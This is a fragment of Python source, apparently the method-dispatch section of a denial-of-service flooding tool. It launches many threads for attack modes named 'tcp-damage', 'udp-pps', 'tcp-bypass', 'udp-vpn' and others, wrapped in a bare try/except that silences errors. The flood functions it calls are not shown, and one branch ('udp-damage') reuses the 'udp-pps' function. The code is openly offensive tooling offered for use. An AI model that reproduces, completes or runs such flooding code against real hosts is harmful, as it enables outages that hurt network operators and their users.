        for _ in range(threads):
            thr(target=rip_tcp).start()
    elif method == 'udp-53':
        for _ in range(threads):
            thr(target=udp_53).start()
    elif method == 'tcp-22':
        for _ in range(threads):
            thr(target=tcp_22).start()
    elif method == 'udp-legend':
        for _ in range(threads):
            thr(target=udp_legend).start()
    elif method == 'udp-vpn':
        for _ in range(threads):
            thr(target=vpn_udp).start()
    elif method == 'tcp-vpn':
        for _ in range(threads):
            thr(target=vpn_tcp).start()
    elif method == 'tcp-pps':
        for _ in range(threads):
            thr(target=tcp_pps).start()
    elif method == 'tcp-damage':
        for _ in range(threads):
            thr(target=tcp_damage).start()
    elif method == 'udp-pps':
        for _ in range(threads):
            thr(target=udp_pps).start()
    elif method == 'udp-damage':
        for _ in range(threads):
            thr(target=udp_pps).start()
    elif method == 'tcp-bypass':
        for _ in range(threads):
            thr(target=tcpbypass).start()
    elif method == 'clasic-udp':
        for _ in range(threads):
            thr(target=clasic).start()
    elif method == 'clasic-tcp':
        for _ in range(threads):
            thr(target=clasic_tcp).start()
    elif method == 'test':
        for _ in range(threads):
            thr(target=test).start()
    
except:
    pass
